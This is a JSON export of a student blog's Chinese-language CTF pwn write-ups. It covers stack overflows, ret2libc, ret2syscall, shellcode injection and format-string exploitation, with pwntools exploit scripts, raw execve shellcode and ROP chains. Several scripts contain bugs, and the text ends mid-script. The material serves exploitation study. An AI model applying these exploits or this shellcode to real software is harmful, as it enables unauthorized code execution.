NepCTF{HRP_aIways_likes_March_7th}","categories":[{"name":"wp","slug":"wp","permalink":"http://lmarch2.github.io/categories/wp/"}],"tags":[{"name":"ctf，NepCTF","slug":"ctf，NepCTF","permalink":"http://lmarch2.github.io/tags/ctf%EF%BC%8CNepCTF/"}]},{"title":"week6-T1","slug":"week6-T1","date":"2023-04-01T07:43:53.000Z","updated":"2024-01-31T02:37:37.721Z","comments":true,"path":"posts/c63e16b3/","link":"","permalink":"http://lmarch2.github.io/posts/c63e16b3/","excerpt":"Week 6 T1 bjdctf_2020_babystack 2023-02-05WPBUUCTF pwn 第十一题考点：ret2text","text":"Week 6 T1 bjdctf_2020_babystack 2023-02-05WPBUUCTF pwn 第十一题考点：ret2text 省略第一步……只开了NX __isoc99_scanf(“%d”, &amp;nbytes) 让用户输入下次输入时接受的数据的长度 read(0, &amp;buf, (unsigned int)nbytes) 用户可以控制长度，实现栈溢出 0x02打开IDA 找到有/bin/sh找到后门函数 buf占用的空间为0x10 0x03exp from pwn import * p = remote('node4.buuoj.cn',29891) backdoor_addr = 0x4006e6 payload =b 'a' * (0x10+8) + p64(backdoor_addr) p.sendline(b'100') p.sendline(payload) p.interactive() 0x04发现这样也不错，交给工具来找地址 变量(unsigned int)nbytes用户可控，且是个无符号函数 可用-1进行绕过，这样用户可输入的数据长度就十分巨大了 接着调用backdoor()即可getshell from pwn import * #start # r = process(\"../buu/bjdctf_2020_babystack\") r = remote(\"node4.buuoj.cn\",29891) elf = ELF(\"../buu/bjdctf_2020_babystack\") #params backdoor_addr = elf.symbols['backdoor'] #attack r.recvuntil(b\"your name:\") r.sendline(\"-1\") r.recvuntil(b\"name?\") payload = b'M' * (0x10 + 8) + p64(backdoor_addr) r.sendline(payload) r.interactive()","categories":[{"name":"入门集训wp","slug":"入门集训wp","permalink":"http://lmarch2.github.io/categories/%E5%85%A5%E9%97%A8%E9%9B%86%E8%AE%ADwp/"}],"tags":[{"name":"ctf","slug":"ctf","permalink":"http://lmarch2.github.io/tags/ctf/"},{"name":"BUUCTF","slug":"BUUCTF","permalink":"http://lmarch2.github.io/tags/BUUCTF/"}]},{"title":"week4&&week5-T5","slug":"week4-week5-T5","date":"2023-04-01T07:36:00.000Z","updated":"2024-01-31T02:37:22.424Z","comments":true,"path":"posts/95338453/","link":"","permalink":"http://lmarch2.github.io/posts/95338453/","excerpt":"T5 ciscn_2019_c_1 2023-01-30WPBUUCTF pwn 题考点：栈溢出 ret2libc3","text":"T5 ciscn_2019_c_1 2023-01-30WPBUUCTF pwn 题考点：栈溢出 ret2libc3 0x01这不上一题刚做这类？直接模仿一手。。。。file checksec —— 64-bit 开NX 0x02运行一下看看 再看看IDA 研究了半天发现是让你加解密的再看看string window 没用system和binsh又发现加密函数里有gets函数，可构成栈溢出 0x03分析 是相同的思想，这里不赘述了，大致流程就是 利用一个程序已经执行过的函数去泄露它在程序中的地址，然后取末尾3个字节，去找到这个程序所使用的libc的版本 用同一个程序里函数的地址-libc里的函数地址即可得到偏移量 得到偏移量后就可以推算出程序中其他函数的地址，知道其他函数的地址之后就可以去执行system（’/bin/sh‘） 0x04写exp from pwn import* from LibcSearcher import* p=remote('node4.buuoj.cn',28342) elf=ELF('./ciscn_2019_c_1') main=0x400b28 pop_rdi=0x400c83 ret=0x4006b9 puts_plt=elf.plt['puts'] puts_got=elf.got['puts'] p.sendlineafter('choice!\\n','1') payload='\\0'+'a'*(0x50-1+8) payload+=p64(pop_rdi) payload+=p64(puts_got) payload+=p64(puts_plt) payload+=p64(main) p.sendlineafter('encrypted\\n',payload) p.recvline() p.recvline() puts_addr=u64(r.recvuntil('\\n')[:-1].ljust(8,'\\0')) print hex(puts_addr) libc=LibcSearcher('puts',puts_addr) offset=puts_addr-libc.dump('puts') binsh=offset+libc.dump('str_bin_sh') system=offset+libc.dump('system') p.sendlineafter('choice!\\n','1') payload='\\0'+'a'*(0x50-1+8) payload+=p64(ret) payload+=p64(pop_rdi) payload+=p64(binsh) payload+=p64(system) p.sendlineafter('encrypted\\n',payload) p.interactive() libcsearch的github网址安装 git clone https://github.com/lieanu/LibcSearcher.gitcd LibcSearchersudo python setup.py develop 覆盖数据payload=b’\\0’+b’a’*(0x50-1+8)\\0是为了让加密函数的一个strlen函数停止（这个函数遇‘0’会停止），从而绕过加密，保证我们构造的rop不会被破坏，buf的大小为0x50-1是减去\\0+8是覆盖rbp 这道题的接收非常讲究泄露地址接收时先是两下recvline()，原因 recvline()一次接收到\\n;第一次recvline只能到Ciphertext；第二次只能接收到0a第三次的recvuntil才开始处理泄露的got地址。先开一下context_log_lever=’debug’，整体看一下， 再自己recvuntil看能接收到什么内容。 然后再用recvuntil(‘\\n’)[:-1].ljust(8,’\\0’)来舍弃接收到的字符串最后的’\\x0’并向左补齐 还有这一道题是64位的程序，这边涉及到64位程序和32位程序运行时的区别了32位程序运行执行指令的时候直接去内存地址寻址执行64位程序则是通过寄存器来传址，寄存器去内存寻址，找到地址返回给程序因此要用寄存器存参（为什么呢？？还是不理解啊） 注意栈对齐虽然我不懂为什么要…… 还有最后为什么还要再输一个0呢？ 搞不懂了 求助 其实做这题主要还是模仿大佬们写的exp，好多细节都不清楚，但是感觉做了那么久又不能扔在那边等完全懂了再写题解 感觉好浪费还得再研究啊 参考资料： [BUUCTF]PWN6——ciscn_2019_c_1","categories":[{"name":"入门集训wp","slug":"入门集训wp","permalink":"http://lmarch2.github.io/categories/%E5%85%A5%E9%97%A8%E9%9B%86%E8%AE%ADwp/"}],"tags":[{"name":"ctf","slug":"ctf","permalink":"http://lmarch2.github.io/tags/ctf/"},{"name":"BUUCTF","slug":"BUUCTF","permalink":"http://lmarch2.github.io/tags/BUUCTF/"}]},{"title":"week4&&week5-T4","slug":"week4-week5-T4","date":"2023-04-01T07:35:47.000Z","updated":"2024-01-31T02:37:05.285Z","comments":true,"path":"posts/e234b4c5/","link":"","permalink":"http://lmarch2.github.io/posts/e234b4c5/","excerpt":"T4 ret2libc3 2021-01-30WPctf-wiki ret2libc3考点：栈溢出rop","text":"T4 ret2libc3 2021-01-30WPctf-wiki ret2libc3考点：栈溢出rop 0x01这个是真的难…… 首先得透彻理解got和plt，其次还得对exp的写作要有一定的熟练度，而且还有各种各样古怪的写法…… 现在我还很多地方琢磨不清楚，只是依葫芦画瓢地复盘了一下，现在这篇题解只是写个大框架，具体细节后面慢慢补充了…… file checksec —— 32-bit 开NX 漏洞和内存分析和之前的系列题类似，不赘述了 0x02IDA看源码，既没有system也没有binsh 由linux延迟绑定机制的知识（后面再写一篇总结吧）可知，我们如果要调用system函数，就要知道他的got表中的地址，但libc被加载到的内存的位置是随机的，我们无法得知不过，同一版本的libc的两个库函数在libc中的相对位置是不变的，所以如果我们可以知道一个已经执行过的函数的got表地址，然后确定libc的版本，就可以加上和system函数的偏移，从而得到system函数的真实地址（got表地址）而现在我们有一个puts函数，libc中也有system和binsh 0x03我们只需要通过栈溢出利用puts函数，打印puts函数的got表中的地址，然后获取偏移，得到system函数和/bin/sh字符串的地址，再将puts函数的返回地址覆盖为system函数的地址即可我们可以先运行exp1（见0x04）拿到获取puts的真实地址，然后去libc- database -search的网站查询，可得到puts函数system函数和binsh字符串对应的偏移地址 （这里直接盗图了……） 知道了puts函数的真实地址和偏移之后，就可以将puts函数的真实地址减去偏移地址，得到libc的基址，将libc的基址分别与system，/bin/sh字符串的偏移相加，就可以得到对应的真实地址然后写完整的exp 0x04所以其实exp是分两部的，第一步是构造栈溢出利用puts函数打印出真实地址；第二步是溢出覆盖至system函数和/bin/sh的地址，拿到shell #first exp from pwn import * elf=ELF('ret2libc3') p=process('./ret2libc3') puts_plt=elf.plt['puts'] puts_got=elf.got['puts'] start_addr = elf.symbols['_start'] payload1=b'A'*112+p32(puts_plt)+p32(start_addr)+p32(puts_got) p.sendlineafter(\"!?\",payload1) puts_addr=u32(p.recv(4)) print(\"puts_got_addr = \",hex(puts_got_addr)) print(\"puts_plt_addr = \",hex(puts_plt_addr)) print(\"main_plt_addr = \",hex(main_plt_addr)) print(\"puts addr = \", hex(puts_addr)) p.interactive() #second exp from pwn import * p = process('./ret2libc3') elf = ELF('./ret2libc3') puts_got_addr = elf.got['puts'] puts_plt_addr = elf.plt['puts'] main_plt_addr = elf.symbols['_start'] print(\"puts_got_addr = \",hex(puts_got_addr)) print(\"puts_plt_addr = \",hex(puts_plt_addr)) print(\"main_plt_addr = \",hex(main_plt_addr)) p.recv() p.sendline(payload) puts_addr = u32(p.recv()[0:4]) print(\"puts_addr = \",hex(puts_addr)) sys_offset = 0x03cd10 puts_offset = 0x067360 sh_offset = 0x17b8cf #根据公式 libc基地址 + 函数偏移量 = 函数真实地址 来计算 libc_base_addr = puts_addr - puts_offset #计算出libc基地址 sys_addr = libc_base_addr + sys_offset #计算出system的真实地址 sh_addr = libc_base_addr + sh_offset #计算出/bin/sh的真实地址 print(\"libc_base_addr = \",hex(libc_base_addr)) print(\"sys_addr = \",hex(sys_addr)) print(\"sh_addr = \",hex(sh_addr)) payload2 = flat([b'A'*112, p32(sys_addr), \"AAAA\", p32(sh_addr)]) p.sendline(payload2) p.interactive() 0x05还有其他几种方法目前没用搞懂之后学会了（看懂了）再写过问： p.recv()[0:4]和p.recv(4）的区别？？网上没搜到要在本地打通是不是要对libc做什么操作呀 参考资料： pwn小白入门06–ret2libc 基本ROP之ret2libc3 yichen二进制安全","categories":[{"name":"入门集训wp","slug":"入门集训wp","permalink":"http://lmarch2.github.io/categories/%E5%85%A5%E9%97%A8%E9%9B%86%E8%AE%ADwp/"}],"tags":[{"name":"ctf","slug":"ctf","permalink":"http://lmarch2.github.io/tags/ctf/"},{"name":"ctf-wiki","slug":"ctf-wiki","permalink":"http://lmarch2.github.io/tags/ctf-wiki/"}]},{"title":"week4&&week5-T3","slug":"week4-week5-T3","date":"2023-04-01T07:35:34.000Z","updated":"2024-01-31T02:36:50.519Z","comments":true,"path":"posts/7c502166/","link":"","permalink":"http://lmarch2.github.io/posts/7c502166/","excerpt":"T3 [第五空间2019 决赛]PWN5 2023-01-27WPBUUCTF pwn第七题考点：格式化字符串漏洞","text":"T3 [第五空间2019 决赛]PWN5 2023-01-27WPBUUCTF pwn第七题考点：格式化字符串漏洞 0x01file &amp;&amp; checksec —— 32 bit , 开启NX，开启cannary 这就没法栈溢出了运行程序看看输出 0x02 IDA查看代码 先找string window 发现/bin/sh，进一步查看发现程序就是先读取用户名，再读入密码，然后再将用户输入的密码和生成的一个随机密码比较，正确则执行system(/bin/sh)，错误则输出fail 观察发现printf(&amp;buf);存在格式化字符串漏洞 （关于格式化字符串漏洞的相关知识会另写一篇） 0x03 现在可以利用%n来修改参数里的内容，我们不知道读入的随机数是多少，那么我们将它改成我们写入的数据就好了 首先利用测试数据”AAAA %08x %08x %08x %08x %08x %08x %08x………… “来确定偏移量， 发现输入的数据是栈的第十个 并且存放生成的随机密码的地址是从0x0804C044开始的，共四字节空间 所以我们可以用%10$,%11$,%12$,%13$去定位到这4个地址，再用%n修改这些地址里的内容 可以构造payload了 0x04 from pwn import* p=remote('node4.buuoj.cn',28332) addr = 0x804c044 payload=p32(addr)+p32(addr+1)+p32(addr+2)+p32(addr+3) payload+=b'%10$n%11$n%12$n%13$n' p.sendline(payload) p.sendline(str(0x10101010)) p.interactive() 因为总共输入了四个地址，共16位，所以%n所赋值的数是16，所以用户输入密码时发送的数据为0x10101010","categories":[{"name":"入门集训wp","slug":"入门集训wp","permalink":"http://lmarch2.github.io/categories/%E5%85%A5%E9%97%A8%E9%9B%86%E8%AE%ADwp/"}],"tags":[{"name":"ctf","slug":"ctf","permalink":"http://lmarch2.github.io/tags/ctf/"},{"name":"BUUCTF","slug":"BUUCTF","permalink":"http://lmarch2.github.io/tags/BUUCTF/"}]},{"title":"week4&&week5-T2","slug":"week4-week5-T2","date":"2023-04-01T07:35:07.000Z","updated":"2024-01-31T02:36:22.417Z","comments":true,"path":"posts/b5711f0/","link":"","permalink":"http://lmarch2.github.io/posts/b5711f0/","excerpt":"T2 ret2syscall 2023-01-22WPctf-wiki 基础rop考点：ret2syscall 题目链接","text":"T2 ret2syscall 2023-01-22WPctf-wiki 基础rop考点：ret2syscall 题目链接 0x01file checksec —— 32-bit 开启NX保护，堆栈不可执行而且注意这是statically linked（静态链接），不能通过泄露库函数地址获取system函数地址 0x02IDA看源码，发现没有system函数可用有gets函数，应该是通过它实现栈溢出 由0x01可知我们不能直接利用程序中的某一段代码或者自己填写代码来获得 shell，所以我们利用程序中的 gadgets 来获得 shell，而对应的 shell 获取则是利用系统调用。采取使用ret2syscall即控制程序执行系统调用，获取 shell。 也就是我们只需要把各个参数放在对应的寄存器中，执行int 0x80 就可实现对系统的调用 0x03利用系统调用来获取shell execve(“/bin/sh”,NULL,NULL) 关于系统调用补充知识见0x05 构造的目标如下 系统调用号，即 eax 应该为 0xb 第一个参数，即 ebx 应该指向 /bin/sh 的地址，其实执行 sh 的地址也可以。 第二个参数，即 ecx 应该为 0 第三个参数，即 edx 应该为 0 我们要找到系统调用相对于的寄存器的值首先要让EAX = 0xb，那么需要的指令是 pop eax ；但是我们并不能期待有一段连续的代码可以同时控制对应的寄存器，所以我们需要一段一段控制，所以pop之后还需要一个ret返回到控制程序执行流， pop eax ；ret 选择这个地址： 0x080bb196 : pop eax ; ret 同理，查找控制其他三个寄存器的gadget 我们选择这个地址： 0x0806eb90 : pop edx ; pop ecx ; pop ebx ; ret 这个可以直接控制其它三个寄存器。 还要获取/bin/sh的地址0x80BE408 还有int 0x80的地址 0x08049421 0x04可以写exp了 from pwn import * p = process(\"./rop\") pop_eax_ret = 0x080bb196 pop_edx_ecx_ebx_ret = 0x0806eb90 int_0x80 = 0x08049421 binsh = 0x80be408 payload = flat([b'A' * 112, pop_eax_ret, 0xb, pop_edx_ecx_ebx_ret, 0, 0, binsh, int_0x80]) #偏移量的计算方法和ret2text的相同 p.sendline(payload) p.interactive() 0x05补充一些系统调用的相关知识 Linux 在x86上的系统调用通过 int 80h 实现，用系统调用号（在 /usr/include/x86_64-linux-gnu/asm/unistd_64.h 和 /usr/include/x86_64-linux-gnu/asm/unistd_32.h 分别可以查看 64 位和 32 位的系统调用号。）来区分入口函数。 操作系统实现系统调用的基本过程是： 应用程序调用库函数（API）； API 将系统调用号存入 EAX，然后通过中断调用使系统进入内核态； 内核中的中断处理函数根据系统调用号，调用对应的内核函数（系统调用）； 系统调用完成相应功能，将返回值存入 EAX，返回到中断处理函数； 中断处理函数返回到 API 中； API 将 EAX 返回给应用程序 应用程序调用系统调用的过程是： 把系统调用的编号存入 EAX； 把函数参数存入其它通用寄存器； 触发 0x80 号中断（int 0x80） Linux在用int 0x80进行系统调用时，调用号存在于EAX，第一个参数存在于EBX，第二个参数存在于ECX，第三个参数存在于EDX 更多系统调用号可参考 参考文章 Reference参考文章： ret2syscall知识点及例题ret2syscallLinux系统调用号 - gsharpsh00ter - 博客园 (cnblogs.com)","categories":[{"name":"入门集训wp","slug":"入门集训wp","permalink":"http://lmarch2.github.io/categories/%E5%85%A5%E9%97%A8%E9%9B%86%E8%AE%ADwp/"}],"tags":[{"name":"ctf","slug":"ctf","permalink":"http://lmarch2.github.io/tags/ctf/"},{"name":"ctf-wiki","slug":"ctf-wiki","permalink":"http://lmarch2.github.io/tags/ctf-wiki/"}]},{"title":"week4 T1","slug":"week4&&week5-T1","date":"2023-01-20T15:36:57.000Z","updated":"2024-01-31T02:42:34.735Z","comments":true,"path":"posts/64ef4d6b/","link":"","permalink":"http://lmarch2.github.io/posts/64ef4d6b/","excerpt":"Week4&amp;&amp;Week5 T1 jarvisoj_level02023-01-20WPBUUCTF pwn 第六题考点： 简单栈溢出/基本rop ret2text","text":"Week4&amp;&amp;Week5 T1 jarvisoj_level02023-01-20WPBUUCTF pwn 第六题考点： 简单栈溢出/基本rop ret2text 0x01file checksec —— 64-bit，开NX 0x02IDA查看发现main函数里的vulnerable_function()函数里的read函数读取0x200ull，而buf空间只有0x80又找到有system(“/bin/sh”)返回其地址 0x03exp from pwn import * p = remote(\"node4.buuoj.cn\",29175) ret_arr = 0X40059A payload = b'a'*(0x80 + 0x8) + p64(ret_arr) p.sendline(payload) p.interactive()","categories":[{"name":"入门集训wp","slug":"入门集训wp","permalink":"http://lmarch2.github.io/categories/%E5%85%A5%E9%97%A8%E9%9B%86%E8%AE%ADwp/"}],"tags":[{"name":"ctf","slug":"ctf","permalink":"http://lmarch2.github.io/tags/ctf/"},{"name":"BUUCTF","slug":"BUUCTF","permalink":"http://lmarch2.github.io/tags/BUUCTF/"}]},{"title":"week3 T5","slug":"week3-T5","date":"2023-01-15T14:43:00.000Z","updated":"2024-01-31T02:34:54.737Z","comments":true,"path":"posts/fe55b1cb/","link":"","permalink":"http://lmarch2.github.io/posts/fe55b1cb/","excerpt":"T5 level2 2023-01-15WP攻防世界pwn题考点：ret2libc1（不是我不想往下做，而是往下做的话真的是要补太多知识了，新的知识还没学会，只好找一题来划一下水了……）","text":"T5 level2 2023-01-15WP攻防世界pwn题考点：ret2libc1（不是我不想往下做，而是往下做的话真的是要补太多知识了，新的知识还没学会，只好找一题来划一下水了……） 0x01file，checksec —— 32-bit，开启NX 0x02IDA一看没啥，点进vuln函数找到一个read函数由图中我们可以看到，buf分配的空间为0x88,而read函数读取0x100，显然存在溢出shift+f12找到有字符串/bin/sh，并且在vuln函数里有system函数，只不过参数是”ehco Input：”罢了记下system函数的plt表地址0x08048320 这样就只需要我们覆盖buf，将system函数地址写为返回地址，并将/bin/sh作为参数传递其地址即可 0x03exp from pwn import * p = remote(' 61.147.171.105 ', 60218) payload = b'a' * (0x88 + 4) + p32(0x08048320)+b'bbbb' + p32(0x0804A024) #0x88为buf大小，+4是ebp大小，p32(0x08048320)是打包system地址，b'bbbb'是填充无效system返回地址， #p32(0x0804A024)是/bin/sh地址 p.sendline(payload) p.interactive()","categories":[{"name":"入门集训wp","slug":"入门集训wp","permalink":"http://lmarch2.github.io/categories/%E5%85%A5%E9%97%A8%E9%9B%86%E8%AE%ADwp/"}],"tags":[{"name":"ctf","slug":"ctf","permalink":"http://lmarch2.github.io/tags/ctf/"},{"name":"攻防世界","slug":"攻防世界","permalink":"http://lmarch2.github.io/tags/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C/"}]},{"title":"week3 T4","slug":"week3-T4","date":"2023-01-15T14:42:38.000Z","updated":"2024-01-31T02:34:46.200Z","comments":true,"path":"posts/8952815d/","link":"","permalink":"http://lmarch2.github.io/posts/8952815d/","excerpt":"T4 ret2shellcode 2 (栈写入) 2023-01-15WPsniperoj-pwn100-shellcode考点：栈溢出 shellcode","text":"T4 ret2shellcode 2 (栈写入) 2023-01-15WPsniperoj-pwn100-shellcode考点：栈溢出 shellcode 0x01file ,checksec检查保护机制开启了PIE 地址变换 0x02IDA中看看源码发现已经有输出了buf的地址，因此随机化地址便可以进行绕过继续分析发现read函数读入0x40字节，而buf分配的空间才0x10字节，存在栈溢出打开string window，没有system和/bin/sh，应该是要写入shellcode了 0x03先看看我们的空间能不能写下shellcode这里main函数里声明的buf只有0x10即16字节，属于局部变量，空间分配在栈上gdb动态调试，（其实IDA能看出来，就是不确定对不对就是了）我们计算buf的偏移量为rbp - rsp = 0x7fffde3d2820 - 0x7fffde3d2810 = 10，再加上rbp 8字节为0x18即24字节 而我们用shellcraft生成的shellcode时44字节的，显然已经超过了于是我们想找一个长度较小的shellcode来写入，但是由于某些我还没搞很懂的原因，我们必须要将把shellcode放在返回地址的后面那放在后面的话是不是44字节的shellcode就可以使用了呢？其实也不行，要注意到read函数是读取0x40字节的，这就使得读取的字符串长度有一定的限制。这0x40字节的数据，既要包括填充的垃圾数据，也要包括shellcode的返回地址和shellcode的内容，我们还得计算一下允许的shellcode的长度0x40 - ( 0x10 + 8 ) - 8 = 32（0x10+8）为造成溢出填充的垃圾数据，后面8为是shellcode地址的长度，所以构建的shllcode必须在32以内之前使用的shellcraft.sh()生成的shellcode有44字节，在这里只有32字节，因此并不适用 shellcode=”\\x31\\xf6\\x48\\xbb\\x2f\\x62\\x69\\x6e\\x2f\\x2f\\x73\\x68\\x56\\x53\\x54\\x5f\\x6a\\x3b\\x58\\x31\\xd2\\x0f\\x05” 一个找shellcode的网站 https://www.exploit-db.com/shellcodeshttp://shell-storm.org/shellcode/ 这个shellcode只有23个字节，短小精悍，适合放在栈中去执行 写exp (发现一个地方：就是正常python代码不能在开头留空格) from pwn import * p = process('./shellcode') p.recvuntil('[') addr = p.recvuntil(']', drop=True) p.recvuntil('Now give me your answer') shellcode=\"\\x31\\xf6\\x48\\xbb\\x2f\\x62\\x69\\x6e\\x2f\\x2f\\x73\\x68\\x56\\x53\\x54\\x5f\\x6a\\x3b\\x58\\x31\\xd2\\x0f\\x05\" p.sendline(b'a'*24 + p64(int(addr,16)+32) + shellcode) p.interactive() 这里我们只知道一个确定的buf的addr，shellcode的地址要从buf的地址推出来，也就是int(addr,16)+32 0x04为什么不可以找一个长度小于24的shellcode直接写入buf中呢？而非要先填充buf再返回至写shellcode的地方呢？在网上找到一个解释不知道对不对 因为其本身是有push指令的，如果我们把shellcode放在返回地址的前面，在程序leave的时候会破坏shellcode，所以我们将其放在后面","categories":[{"name":"入门集训wp","slug":"入门集训wp","permalink":"http://lmarch2.github.io/categories/%E5%85%A5%E9%97%A8%E9%9B%86%E8%AE%ADwp/"}],"tags":[{"name":"ctf","slug":"ctf","permalink":"http://lmarch2.github.io/tags/ctf/"},{"name":"ctf-wiki","slug":"ctf-wiki","permalink":"http://lmarch2.github.io/tags/ctf-wiki/"}]},{"title":"week3 T3","slug":"week3-T3","date":"2023-01-15T14:41:45.000Z","updated":"2024-01-31T02:34:38.718Z","comments":true,"path":"posts/173614fe/","link":"","permalink":"http://lmarch2.github.io/posts/173614fe/","excerpt":"T3 ret2shellcode 1 (bss段写入) 2023-01-15WPctf-wiki pwn考点：栈溢出 shellcode","text":"T3 ret2shellcode 1 (bss段写入) 2023-01-15WPctf-wiki pwn考点：栈溢出 shellcode 0x01file，checksec —— 32bit，啥保护都没开 0x02IDA查看源码，没有system函数和/bin/sh字符串并且可以看到，main函数中，gets函数读取用户输入到变量s，strcnp将s中的字符串复制到buf2处buf2并没有在main函数中看到定义，应该是全局变量，进一步查看buf2在bss段中 0x03通过vmmap我们可以查看bss段是否具有可执行权限rw-p，可读可写（这里操作上要注意一下，vmmap的命令要在程序运行时使用，可以给程序下断点或者ctrl+C停住程序再输命令） 参考资料 0x04有执行权限的话就可以向bss段写入shellcode了，之后控制程序返回执行shellcode在写exp之前还要先计算偏移量，方法和ret2text类似，与之前的偏移量都是一样的用gdb调试或者爆破求出偏移量为112使用shellcraft.sh()生成shellcode，并且用shellcode.ljust()方法向左对齐补齐字符串，溢出填充返回地址exp为 from pwn import * p = process('./ret2shellcode') shellcode = asm(shellcraft.sh()) buf2_addr = 0x804a080 p.sendline(shellcode.ljust(112, 'A') + p32(buf2_addr)) p.interactive() 0x05好像shellcode写在栈或者bss段上都可以吧？ 网上看到一个解释说不能直接把shellcode写在栈上？不知道对不对：绝大多数的操作系统都默认开启ASLR保护，这大大提高了攻击栈的难度。因此，栈应当是我们最后考虑的对象","categories":[{"name":"入门集训wp","slug":"入门集训wp","permalink":"http://lmarch2.github.io/categories/%E5%85%A5%E9%97%A8%E9%9B%86%E8%AE%ADwp/"}],"tags":[{"name":"ctf","slug":"ctf","permalink":"http://lmarch2.github.io/tags/ctf/"},{"name":"ctf-wiki","slug":"ctf-wiki","permalink":"http://lmarch2.github.io/tags/ctf-wiki/"}]},{"title":"week3 T2","slug":"week3-T2","date":"2023-01-15T14:41:00.000Z","updated":"2024-01-31T02:34:32.445Z","comments":true,"path":"posts/60312468/","link":"","permalink":"http://lmarch2.github.io/posts/60312468/","excerpt":"T2 wustctf2020_closed 2023-01-15WPBUUCTF pwn考点：close函数","text":"T2 wustctf2020_closed 2023-01-15WPBUUCTF pwn考点：close函数 0x01做了hgame的第二题后，去补充了一下关于close函数的知识，再从BUUCTF中找了一题练了练先file知道时64-bit 0x02这一题结构很简单，再IDA中直接能找到在main函数中的vulnerable函数中return shell函数中有system函数直接给好了 0x03但是因为 close(1) close(2) 将标准输出和标准错误输出关闭了，这样在窗口上看不到输出这时候就需要我们重新定位标准输出 0x04补充一些知识 在Linux中的文件，文件描述符（file descriptor）是内核为了高效管理已被打开的文件所创建的索引，是一个非负整数（通常是小整数），用于指代被打开的文件，所有执行I/O操作的系统调用都通过文件描述符。程序刚刚启动的时候，0是标准输入，1是标准输出，2是标准错误。如果此时去打开一个新的文件，它的文件描述符会是3。 标准输入输出的指向是默认的，也就是默认打开一个终端后，0，1，2都指向同一个位置也就是当前终端，我们可以修改它们的指向，也即重定位 我们可以将标准输出进行重定向 &amp;+文件描述符, 可以指代该文件(进程) 现在可以解决close函数的问题了在同一个进程里面, 标准输出和标准输入的指向都是相同的终端. 由于标准输入没有被禁用，所以我们可以使用命令 exec 1&gt;&amp;0 让标准输出定位到标准输入的文件，也就相当于重启了标准输出本质上即exec+重定向命令，只不过操作的是文件描述符现在cat到的flag就能够输出了出题人很有意思，连接上环境第一件事是嘲讽一下你 参考 文章","categories":[{"name":"入门集训wp","slug":"入门集训wp","permalink":"http://lmarch2.github.io/categories/%E5%85%A5%E9%97%A8%E9%9B%86%E8%AE%ADwp/"}],"tags":[{"name":"ctf","slug":"ctf","permalink":"http://lmarch2.github.io/tags/ctf/"},{"name":"BUUCTF","slug":"BUUCTF","permalink":"http://lmarch2.github.io/tags/BUUCTF/"}]},{"title":"week3 T1","slug":"week3-T1","date":"2023-01-15T01:32:24.000Z","updated":"2024-01-31T02:34:24.107Z","comments":true,"path":"posts/f93875d2/","link":"","permalink":"http://lmarch2.github.io/posts/f93875d2/","excerpt":"T1 easy_overflow 2023-01-14WPHgame week1 pwn 第二题考点：简单栈溢出","text":"T1 easy_overflow 2023-01-14WPHgame week1 pwn 第二题考点：简单栈溢出 0x01file——64-bit,checksec 开启NX 0x02IDA看源码，先找/bin/sh，一路索引过去发现在一个后门函数中 然后我的第一反应是先记下call system的地址，结果一看，没找到？取而代之的是call sub_401060于是我卡了一下，可能是第一次碰到这样的题的缘故，我没有意识到函数名称可以是不一样的打开main函数伪代码也是这样……越看越不对劲，搜索资料才发现这种题的风格就是去符号使原函数名字无法显示这么说IDA无法解决了 0x03我们转而动态调试试一下我们假设文件带有system函数，又据题意应该是有gets或者read之类的函数的运行文件测试一下确实如此那么我们在这几个函数处试着打断点我们可以看到，其中system的地址和后面函数中的call sub_401060的plt处地址对上了read函数的地址和main函数中的 call sub_401080的plt处地址对上了同时呢，gdb运行文件的时候还发现main函数中还有一个close函数，浏览一下main函数源码只有sub_401070了查阅了一些资料得知，close(1)关闭了标准输出，详细见这篇文章也就是有下面我们得到shell后无法在屏幕上看到flag的情况这时候就要输入exec 1&gt;&amp;0重启标准输出那么现在呢我们已经把文件里的几个主要函数分析好了，接下来就要找偏移量了 0x03这一部分我发现一个很坑的地方，如果我们用ctf-wilki上的方法，那么我们在gdb调试设断点的时候就不能设 b read 这样设的话我们直接就进入到read函数里了，那就无法看到储存数据的寄存器（不管是什么）距rsp或者rbp的偏移了并且，此时已经开始进入read子函数，即已经分配了新的栈帧了，rsp已经移动，再去计算rsp和rbp的差值则会不准确 b *0x4011be 我们应该这样设断点，这样就停止在进入read函数之前，不仅可以看到相对偏移,还能计算出rbp-rsp得出rsp和rsi 0x7fffffffddd0,rbp为0x7fffffffdde0,计算得距rbp偏移量就为0x7fffffffdde0-0x7fffffffddd0那么再加上rbp求得为0x10+8 还可以暴力求得 懒得计算偏移量的话 0x04可以写exp from pwn import * p = remote(\"week-1.hgame.lwsec.cn\", 30574) system_addr = 000000000401176 payload = b ' a ' * 0x18 + p64(system_addr) p.sendline(payload) p.interactive() 0x05好奇怪为什么官方的WP可以直接反汇编成正常的函数？搜了一下好像可以手动添加标签,这篇文章教了一下这么回复库函数名，但是看不懂…… 0x06得到shell后发现并没有办法显示出flag，问题就在之前的那个close(1)因为汇编代码中有这样一句 mov edi, 1 所以认为close()括号里的参数时1这时候需要使用命令让shell能够正常回显 exec 1&gt;&amp;0 累死了，终于拿到flag","categories":[{"name":"入门集训wp","slug":"入门集训wp","permalink":"http://lmarch2.github.io/categories/%E5%85%A5%E9%97%A8%E9%9B%86%E8%AE%ADwp/"}],"tags":[{"name":"ctf","slug":"ctf","permalink":"http://lmarch2.github.io/tags/ctf/"},{"name":"hgame","slug":"hgame","permalink":"http://lmarch2.github.io/tags/hgame/"}]},{"title":"week2 T5","slug":"week2-T5","date":"2023-01-13T13:03:38.000Z","updated":"2024-01-31T02:34:16.034Z","comments":true,"path":"posts/46e9d6ae/","link":"","permalink":"http://lmarch2.github.io/posts/46e9d6ae/","excerpt":"T5 cgpwn2 2023-01-09WP攻防世界 pwn题","text":"T5 cgpwn2 2023-01-09WP攻防世界 pwn题 0x01file checksec——32-bit，开启NX保护 0x02IDA中打开window发现这题又是一个找不到/bin/sh的但是在pwn函数中还是找到了system函数的然后我们来看hello函数的反汇编代码好像有点复杂，简单来说就是前面先定义了一堆变量，然后条件判断先不看了先看后面的首先要求我们输入一个名字，通过fgets函数完成，并且从键盘最多只能读取32h个字符到name然后再通过gets函数从键盘读取字符到s区域，没有输入字符数量的限制其中name是bss段的一个大小为34的区域，s是长度为0x26个字节的区域于是我们可以向name区域输入/bin/sh,然后让这个地址作为system函数的参数，而s则用来进行栈溢出，并让溢出的返回地址为system函数的地址 0x03exp from pwn import * p = remote(’61.147.171.105‘，51582) target = 0x804855A binsh = 0x804A080 payload = b'a' * 0x26 +b 'bbbb' #覆盖s和ebp的数据 + p32(target) + p32(binsh)#返回gets函数的地址和参数 a = 